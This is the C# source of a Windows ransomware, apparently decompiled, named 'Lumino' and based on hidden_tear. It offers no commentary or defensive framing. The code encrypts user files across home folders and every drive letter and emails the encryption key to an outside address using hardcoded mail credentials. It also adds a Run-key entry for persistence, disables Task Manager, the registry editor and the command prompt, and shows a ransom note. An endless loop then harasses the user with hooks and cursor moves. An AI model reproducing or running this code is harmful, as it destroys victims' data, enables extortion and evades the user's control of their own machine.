using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using GlobalHook;
using Microsoft.Win32;

namespace hidden_tear;

public class Form1 : Form
{
	private readonly string userName = Environment.UserName;

	private readonly string computerName = Environment.MachineName.ToString();

	private readonly string userDir = "C:\\Users\\";

	private readonly UserActivityHook _gHook = new UserActivityHook();

	private readonly string[] _AsciiChars = new string[11]
	{
		"#", "#", "@", "%", "=", "+", "*", ":", "-", ".",
		"&nbsp;"
	};

	private string _Content;

	private IContainer components;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		StartAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private void SendPassword(string password)
	{
		string body = computerName + "-" + userName + " " + password;
		MailAddress from = new MailAddress("lumino110908@gmail.com", "Ransom");
		MailAddress to = new MailAddress("ware.ransom@yahoo.com", "Ransom");
		SmtpClient smtpClient = new SmtpClient
		{
			Host = "smtp-mail.outlook.com",
			Port = 587,
			EnableSsl = true,
			DeliveryMethod = SmtpDeliveryMethod.Network,
			UseDefaultCredentials = false,
			Credentials = new NetworkCredential("lumino110908@gmail.com", "Lumino1109")
		};
		using MailMessage message = new MailMessage(from, to)
		{
			Subject = "Ransom_Key",
			Body = body
		};
		smtpClient.Send(message);
	}

	public void EncryptFile(string file, string password)
	{
		try
		{
			byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = AES_Encrypt(bytesToBeEncrypted, bytes);
			File.WriteAllBytes(file, bytes2);
			File.Move(file, file + ".lumino_locked");
		}
		catch (IOException)
		{
		}
	}

	public void Pass_crypter()
	{
		try
		{
			string password = CreatePassword(15);
			string location = userDir + userName + "\\Documents";
			string location2 = userDir + userName + "\\Desktop";
			string location3 = userDir + userName + "\\Pictures";
			string location4 = userDir + userName + "\\Videos";
			string location5 = userDir + userName + "\\Music";
			string location6 = userDir + userName + "\\Downloads";
			EncryptDirectory(location, password);
			EncryptDirectory(location2, password);
			EncryptDirectory(location3, password);
			EncryptDirectory(location4, password);
			EncryptDirectory(location5, password);
			EncryptDirectory(location6, password);
			EncryptDirectory("A:\\", password);
			EncryptDirectory("B:\\", password);
			EncryptDirectory("C:\\", password);
			EncryptDirectory("D:\\", password);
			EncryptDirectory("E:\\", password);
			EncryptDirectory("F:\\", password);
			EncryptDirectory("G:\\", password);
			EncryptDirectory("H:\\", password);
			EncryptDirectory("I:\\", password);
			EncryptDirectory("J:\\", password);
			EncryptDirectory("K:\\", password);
			EncryptDirectory("L:\\", password);
			EncryptDirectory("M:\\", password);
			EncryptDirectory("N:\\", password);
			EncryptDirectory("O:\\", password);
			EncryptDirectory("P:\\", password);
			EncryptDirectory("Q:\\", password);
			EncryptDirectory("R:\\", password);
			EncryptDirectory("S:\\", password);
			EncryptDirectory("T:\\", password);
			EncryptDirectory("U:\\", password);
			EncryptDirectory("V:\\", password);
			EncryptDirectory("W:\\", password);
			EncryptDirectory("X:\\", password);
			EncryptDirectory("Y:\\", password);
			EncryptDirectory("Z:\\", password);
		}
		catch (UnauthorizedAccessException)
		{
		}
		catch (DirectoryNotFoundException)
		{
		}
	}

	public void EncryptDirectory(string location, string password)
	{
		try
		{
			string[] source = new string[31]
			{
				".log", ".sys", ".dll", ".md", ".exe", ".lnk", ".JPG", ".h", ".c", ".txt",
				".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv",
				".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".ini",
				".inf"
			};
			string[] files = Directory.GetFiles(location);
			string[] directories = Directory.GetDirectories(location);
			for (int i = 0; i < files.Length; i++)
			{
				string extension = Path.GetExtension(files[i]);
				if (source.Contains(extension))
				{
					EncryptFile(files[i], password);
				}
			}
			for (int j = 0; j < directories.Length; j++)
			{
				EncryptDirectory(directories[j], password);
			}
		}
		catch (IOException)
		{
		}
		catch (UnauthorizedAccessException)
		{
		}
	}

	public void ASCII_Art()
	{
		try
		{
			ConvertToAscii_Path();
			Thread.Sleep(2000);
			Process.Start(userDir + userName + "\\Lumino.hta");
			Thread.Sleep(1000);
			SendKeys.Send("^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT} ^+{SUBTRACT}");
		}
		catch (Win32Exception)
		{
		}
	}

	public void Del_NCS_Ani()
	{
		SendKeys.Send("{NUMLOCK}");
		Console.Beep(125, 200);
		SendKeys.Send("{NUMLOCK}");
		Thread.Sleep(500);
		SendKeys.Send("{CAPSLOCK}");
		Console.Beep(500, 200);
		SendKeys.Send("{CAPSLOCK}");
		Thread.Sleep(500);
		SendKeys.Send("{SCROLLLOCK}");
		Console.Beep(1000, 200);
		SendKeys.Send("{SCROLLLOCK}");
		Thread.Sleep(1000);
		SendKeys.Send("{SCROLLLOCK}");
		Console.Beep(1000, 200);
		SendKeys.Send("{SCROLLLOCK}");
		Thread.Sleep(500);
		SendKeys.Send("{CAPSLOCK}");
		Console.Beep(500, 200);
		SendKeys.Send("{CAPSLOCK}");
		Thread.Sleep(500);
		SendKeys.Send("{NUMLOCK}");
		Console.Beep(125, 200);
		SendKeys.Send("{NUMLOCK}");
		Thread.Sleep(2000);
		SendKeys.Send("{SCROLLLOCK}");
		Console.Beep(1000, 200);
		SendKeys.Send("{SCROLLLOCK}");
		Thread.Sleep(500);
		SendKeys.Send("{CAPSLOCK}");
		Console.Beep(500, 200);
		SendKeys.Send("{CAPSLOCK}");
		Thread.Sleep(500);
		SendKeys.Send("{NUMLOCK}");
		Console.Beep(125, 200);
		SendKeys.Send("{NUMLOCK}");
		Thread.Sleep(1000);
		SendKeys.Send("{NUMLOCK}");
		Console.Beep(125, 200);
		SendKeys.Send("{NUMLOCK}");
		Thread.Sleep(500);
		SendKeys.Send("{CAPSLOCK}");
		Console.Beep(500, 200);
		SendKeys.Send("{CAPSLOCK}");
		Thread.Sleep(500);
		SendKeys.Send("{SCROLLLOCK}");
		Console.Beep(1000, 200);
		SendKeys.Send("{SCROLLLOCK}");
	}

	public void Del_NCS_Ani2()
	{
		SendKeys.Send("{NUMLOCK}");
		Console.Beep(125, 200);
		SendKeys.Send("{NUMLOCK}");
		Thread.Sleep(100);
		SendKeys.Send("{CAPSLOCK}");
		Console.Beep(500, 200);
		SendKeys.Send("{CAPSLOCK}");
		Thread.Sleep(100);
		SendKeys.Send("{SCROLLLOCK}");
		Console.Beep(1000, 200);
		SendKeys.Send("{SCROLLLOCK}");
		Thread.Sleep(500);
		SendKeys.Send("{SCROLLLOCK}");
		Console.Beep(1000, 200);
		SendKeys.Send("{SCROLLLOCK}");
		Thread.Sleep(100);
		SendKeys.Send("{CAPSLOCK}");
		Console.Beep(500, 200);
		SendKeys.Send("{CAPSLOCK}");
		Thread.Sleep(100);
		SendKeys.Send("{NUMLOCK}");
		Console.Beep(125, 200);
		SendKeys.Send("{NUMLOCK}");
		Thread.Sleep(500);
		SendKeys.Send("{SCROLLLOCK}");
		Console.Beep(1000, 200);
		SendKeys.Send("{SCROLLLOCK}");
		Thread.Sleep(100);
		SendKeys.Send("{CAPSLOCK}");
		Console.Beep(500, 200);
		SendKeys.Send("{CAPSLOCK}");
		Thread.Sleep(100);
		SendKeys.Send("{NUMLOCK}");
		Console.Beep(125, 200);
		SendKeys.Send("{NUMLOCK}");
		Thread.Sleep(500);
		SendKeys.Send("{NUMLOCK}");
		Console.Beep(125, 200);
		SendKeys.Send("{NUMLOCK}");
		Thread.Sleep(100);
		SendKeys.Send("{CAPSLOCK}");
		Console.Beep(500, 200);
		SendKeys.Send("{CAPSLOCK}");
		Thread.Sleep(100);
		SendKeys.Send("{SCROLLLOCK}");
		Console.Beep(1000, 200);
		SendKeys.Send("{SCROLLLOCK}");
	}

	public void Disble_Taskmgr()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.GetValue("DisableTaskMgr");
		registryKey.SetValue("DisableTaskMgr", "1", RegistryValueKind.DWord);
	}

	public void Disble_Registry()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
		registryKey.SetValue("DisableRegistryTools", "1", RegistryValueKind.DWord);
		registryKey.Close();
	}

	public void Disble_CMD()
	{
		RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
		registryKey.SetValue("DisableCMD", "1", RegistryValueKind.DWord);
		registryKey.Close();
	}

	public void StartAction()
	{
		StartAction_Organisation();
	}

	[DllImport("user32")]
	public static extern int SetCursorPos(int x, int y);

	public void Finish_infini()
	{
		for (int num = 2; num > 1; num = num++)
		{
			Cursor.Hide();
			int num2 = new Random().Next(30001);
			Cursor.Hide();
			Del_NCS_Ani2();
			Thread.Sleep(num2--);
			Process.Start("https://www.bing.com/search?ptag=ICO-e5da190ded9a292e&form=INCOH1&pc=1CDT&q=Ransomware");
			_gHook.Start_key();
			Thread.Sleep(num2--);
			Process.Start("https://www.google.com/search?ptag=ICO-e5da190ded9a292e&form=INCOH1&pc=1CDT&q=Ransomware");
			Thread.Sleep(num2--);
			_gHook.Stop_key();
			Programtxt();
			Cursor.Hide();
			Del_NCS_Ani2();
			_gHook.Start_mouse();
			SendKeys.Send("RANSOMWARE{ENTER}");
			Thread.Sleep(num2--);
			Cursor.Hide();
			Del_NCS_Ani2();
			SendKeys.Send("ware.ransom@yahoo.com !");
			_gHook.Start_key();
			_gHook.Stop_mouse();
			SetCursorPos(500, 5);
			Thread.Sleep(num2--);
			SetCursorPos(1000, 891);
			Thread.Sleep(num2--);
			SetCursorPos(60, 967);
			Thread.Sleep(num2--);
			_gHook.Stop_key();
			Del_NCS_Ani2();
		}
	}

	public void Send_keys()
	{
		try
		{
			Cursor.Hide();
			SetCursorPos(500, 615);
			_gHook.Start_mouse();
			SendKeys.Send("EN: {ENTER}Hi !!! {ENTER}Your file was encrypted by the ransomware: Lumino_Ransom, if you want to decrypt him, send me à mail with the user name pc at ware.ransom@yahoo.com and I give to you the password (for free ;) that you need to enter in Lumino_decrypt ! On the other hand, you have no luck, it's the Hard's version of my Ransomware that I've created then... {ENTER} {ENTER}");
			SendKeys.Send("FR: {ENTER}Salut !!! {ENTER}Vos fichier on été encypté par le ransomware: Lumino_ransom, si tu veux les décryptés, envoie moi un mail avec ton nom d'utilisateur à ware.ransom@yahoo.com et je te donnerais le mot de passe (gratuitement ;) qu'il faudra entrer dans Lumino_decrypt ! Par contre, t'as pas de chance, c'est la version Hard mon Ransomware que j'ai crée donc...");
			SendKeys.Send("{ENTER} {ENTER}The window/notepad gonna be closed automaticaly after 20 secondes !");
			SendKeys.Send("{ENTER}La fenettre/le bloc note vas être fermé(e) automatiquement après 20 secondes !");
			_gHook.Stop_mouse();
			Thread.Sleep(20000);
			SendKeys.Send("%+{F4}{RIGHT}{ENTER}");
		}
		catch (Win32Exception)
		{
		}
	}

	public void Registry_Copy()
	{
		string arguments = "/C mkdir C:\\win64-loader\\";
		Process.Start("cmd.exe", arguments);
		string arguments2 = "/C REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Luminoware /t REG_SZ /d C:\\win64-loader\\luminoware 3.1.exe";
		Process.Start("cmd.exe", arguments2);
		Thread.Sleep(1000);
		string arguments3 = "/C copy luminoware 3.1.exe C:\\win64-loader\\ & pause";
		Process.Start("cmd.exe", arguments3);
	}

	public void FileLumine()
	{
		try
		{
			int i = 0;
			int num = 1;
			for (; i < 400; i++)
			{
				string text = "\\Desktop\\Lumine";
				string path = userDir + userName + text + num;
				num++;
				File.Create(path);
			}
		}
		catch (IOException)
		{
		}
	}

	public void Programtxt()
	{
		Process.Start("notepad.exe");
		Thread.Sleep(2000);
	}

	public void ConvertToAscii_Path()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		string text = "ASCII.bmp";
		try
		{
			if (File.Exists(text))
			{
				Bitmap inputBitmap = new Bitmap(text);
				inputBitmap = GetReSizedImage(inputBitmap, 1024);
				_Content = ConvertToAscii(inputBitmap);
				StreamWriter streamWriter = new StreamWriter(userDir + userName + "\\Lumino.hta");
				streamWriter.Write("<hta:application id=\"oBVC\" \r\napplicationname=\"BSOD\"  \r\nversion=\"1.0\" \r\nmaximizebutton=\"no\" \r\nminimizebutton=\"no\" \r\nsysmenu=\"no\" \r\nCaption=\"no\" \r\nwindowstate=\"maximize\"/> \r");
				streamWriter.Write(_Content);
				streamWriter.Flush();
				streamWriter.Close();
			}
		}
		catch (Win32Exception)
		{
		}
	}

	private string ConvertToAscii(Bitmap image)
	{
		bool flag = false;
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < ((Image)image).get_Height(); i++)
		{
			for (int j = 0; j < ((Image)image).get_Width(); j++)
			{
				Color pixel = image.GetPixel(j, i);
				int red = (pixel.R + pixel.G + pixel.B) / 3;
				int green = (pixel.R + pixel.G + pixel.B) / 3;
				int blue = (pixel.R + pixel.G + pixel.B) / 3;
				Color color = Color.FromArgb(red, green, blue);
				if (!flag)
				{
					int num = color.R * 10 / 255;
					stringBuilder.Append(_AsciiChars[num]);
				}
			}
			if (!flag)
			{
				stringBuilder.Append("<BR>");
				flag = true;
			}
			else
			{
				flag = false;
			}
		}
		return stringBuilder.ToString();
	}

	private Bitmap GetReSizedImage(Bitmap inputBitmap, int asciiWidth)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_003e: Expected O, but got Unknown
		int num = (int)Math.Ceiling((double)((Image)inputBitmap).get_Height() * (double)asciiWidth / (double)((Image)inputBitmap).get_Width());
		Bitmap val = new Bitmap(asciiWidth, num);
		Graphics obj = Graphics.FromImage((Image)val);
		obj.set_InterpolationMode((InterpolationMode)7);
		obj.DrawImage((Image)(object)inputBitmap, 0, 0, asciiWidth, num);
		obj.Dispose();
		return val;
	}

	private void StartAction_Organisation()
	{
		string password = CreatePassword(15);
		string text = "\\Desktop";
		string location = userDir + userName + text;
		Del_NCS_Ani();
		ASCII_Art();
		Registry_Copy();
		Disble_Taskmgr();
		Disble_Registry();
		Disble_CMD();
		EncryptDirectory(location, password);
		Pass_crypter();
		FileLumine();
		Thread.Sleep(5000);
		Programtxt();
		Send_keys();
		password = null;
		Del_NCS_Ani2();
		Finish_infini();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0056: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(120, 0));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("luminoware");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
